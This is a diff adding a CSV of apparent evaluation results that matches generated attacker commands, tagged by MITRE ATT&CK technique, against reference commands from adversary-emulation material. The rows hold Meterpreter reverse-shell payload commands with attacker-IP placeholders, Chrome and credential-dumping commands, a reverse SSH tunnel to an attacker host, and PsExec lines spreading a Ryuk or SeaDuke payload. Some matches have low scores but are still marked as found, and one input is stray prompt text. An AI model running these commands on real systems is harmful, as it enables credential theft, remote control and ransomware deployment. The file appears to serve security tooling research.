@@ -1,0 +1,86 @@
+file,tool,input_command,matched_command,edit_score,match_found
+command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.438,True
+command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.421,True
+command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords -p > output.txt,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.404,True
+command_metasploit_TA0002_T1035.txt,metasploit,msfpayload windows/xp/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> > payload.exe,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,0.654,True
+command_metasploit_TA0002_T1059.txt,metasploit,use auxiliary/scanner/smb/smb_login,"```sh
+msf> use auxiliary/admin/smb/psexec_ntdsgrab
+```",0.517,True
+command_metasploit_TA0002_T1059.txt,metasploit,set RHOST <IP_address>,`meterpreter > load powershell`,0.302,True
+command_metasploit_TA0002_T1059.txt,metasploit,set SMBUSER <username>,`msf> loot -t screenspy.screenshot`,0.281,True
+command_metasploit_TA0002_T1059.txt,metasploit,set SMBPASS <password>,`msf> loot -t screenspy.screenshot`,0.281,True
+command_metasploit_TA0002_T1059.txt,metasploit,exploit,`meterpreter > load powershell`,0.211,True
+command_metasploit_TA0002_T1059.txt,metasploit,use post/windows/manage/powershell Empire,[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,0.393,True
+command_metasploit_TA0002_T1059.txt,metasploit,"set LOAD_MODULES powershell,Empire",`meterpreter > load powershell`,0.431,True
+command_metasploit_TA0002_T1059.txt,metasploit,run,`sudo msfconsole`,0.2,True
+command_metasploit_TA0002_T1059.txt,metasploit,use post/windows/manage/powershell Empire/tunnel_powershell,`meterpreter > powershell_import /home/<attacker>/carbanak/Resources/step6/powerview.ps1`,0.351,True
+command_metasploit_TA0002_T1059.txt,metasploit,set LHOST <IP_address>,`meterpreter > load powershell`,0.302,True
+command_metasploit_TA0002_T1059.txt,metasploit,set LPORT <port_number>,`meterpreter> getsystem -t 1`,0.308,True
+command_metasploit_TA0002_T1059.txt,metasploit,run,`sudo msfconsole`,0.2,True
+command_metasploit_TA0002_T1059.txt,metasploit,""" and enclosed in backticks (`) as required.","[meterpreter\*] > `upload SysinternalsSuite.zip ""C:\\Users\\username\\Downloads\\SysinternalsSuite.zip""`",0.23,True
+command_metasploit_TA0007_T1018.txt,metasploit,recon info,`sudo msfconsole`,0.296,True
+command_metasploit_TA0007_T1018.txt,metasploit,routes -h,`meterpreter> getsystem -t 1`,0.263,True
+command_metasploit_TA0007_T1018.txt,metasploit,"plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389","[meterpreter\*] > `upload SysinternalsSuite.zip ""C:\\Users\\username\\Downloads\\SysinternalsSuite.zip""`",0.246,True
+command_metasploit_TA0007_T1057.txt,metasploit,code_factory.make_random_stub --type if_statement,`meterpreter > migrate -N mstsc.exe `,0.233,True
+command_metasploit_TA0007_T1082.txt,metasploit,use powershell mixin; payload_info; osinfo,`meterpreter > load powershell`,0.329,True
+command_metasploit_TA0011_T1071.txt,metasploit,use scanner/winrm/winrm_login,"```sh
+msf> use auxiliary/admin/smb/psexec_ntdsgrab
+```",0.241,True
+command_metasploit_TA0011_T1071.txt,metasploit,run http://user:<pass>@<remote_IP>:5985,`meterpreter> getsystem -t 1`,0.265,True
+command_plink_TA0011_T1105.txt,plink,"plink.exe -i <private_key_file> -ssh user@192.168.0.4 -m ""<command_to_execute>""","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",0.478,True
+command_psexec_TA0001_T1078.txt,psexec,psexec \\remote-system -u <new-user-name> -p <password> -i,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.32,True
+command_psexec_TA0001_T1078.txt,psexec,psexec \\example.com -u testuser -p Test123! -i,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.252,True
+command_psexec_TA0001_T1078.txt,psexec,"psexec \\remote-system -u <admin-account> -c <target-executable> -a 1,2 -f","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.191,True
+command_psexec_TA0001_T1078.txt,psexec,"psexec \\example.com -u adminuser -c C:\path\to\malware.exe -a 1,2 -f","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.136,True
+command_psexec_TA0001_T1078.txt,psexec,psexec \\remote-system -l -i,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.164,True
+command_psexec_TA0001_T1078.txt,psexec,psexec \\example.com -l -i,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.187,True
+command_psexec_TA0001_T1078.txt,psexec,psexec \\remote-system -u <user-name> -p <password> -i,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.308,True
+command_psexec_TA0001_T1078.txt,psexec,psexec \\example.com -u testuser -p Test123! -i,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.252,True
+command_psexec_TA0001_T1078.txt,psexec,psexec \\remote-system -w <directory-path> -i,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.16,True
+command_psexec_TA0001_T1078.txt,psexec,psexec \\example.com -w C:\path\to\working\dir -i,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.222,True
+command_psexec_TA0003_T1078.txt,psexec,psexec \\remote-system -u <new_user_name> -p <password>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.306,True
+command_psexec_TA0003_T1078.txt,psexec,psexec \\remote-system -s -u <new_system_account> -p <password>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.27,True
+command_psexec_TA0003_T1078.txt,psexec,"psexec \\remote-system -i -u <existing_admin_account> -p <password> -a 1,3","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.174,True
+command_psexec_TA0003_T1078.txt,psexec,psexec \\remote-system -c C:\path\to\executable.exe -u <existing_admin_account> -p <password>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.208,True
+command_psexec_TA0003_T1078.txt,psexec,psexec \\remote-system -e -u <new_user_name> -p <password> -w C:\directory,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.357,True
+command_psexec_TA0004_T1078.txt,psexec,psexec -u <new_user_name> -p <new_password> //remote-system,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.301,True
+command_psexec_TA0004_T1078.txt,psexec,"psexec -a 1,2 -c -i -l -s -v C:\path\to\new.exe //remote-system","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.139,True
+command_psexec_TA0004_T1078.txt,psexec,psexec -e -f -i -n <timeout_seconds> -u <existing_user_name> -w C:\path\to\directory //remote-system,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.292,True
+command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -u <new_user_name> -p <password> -l,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.32,True
+command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -u Domain\Administrator -p <password> -s -i,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.283,True
+command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -u Domain\Administrator -p <password> -h,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.278,True
+command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -u Domain\Username -p <password> -l,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.347,True
+command_psexec_TA0006_T1003.txt,psexec,"psexec -i -u <Domain\User> -p <password> cmd /c ""whoami""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.332,True
+command_psexec_TA0008_T1021.txt,psexec,"psexec \\* -u <attacker_username> -c ""<path_to_Ryuk_binary>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.282,True
+command_psexec_TA0008_T1021.txt,psexec,"psexec \\<host1> -s -c ""<path_to_Ryuk_binary>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.225,True
+command_psexec_TA0008_T1021.txt,psexec,"psexec @<list_of_hosts_file> -u <attacker_username> -c ""<path_to_Ryuk_binary>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.286,True
+command_psexec_TA0008_T1021.txt,psexec,"psexec \\<host1> -e -c ""<path_to_Ryuk_binary>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.225,True
+command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe -p <process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,0.63,True
+command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe --process-name <target_process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,0.609,True
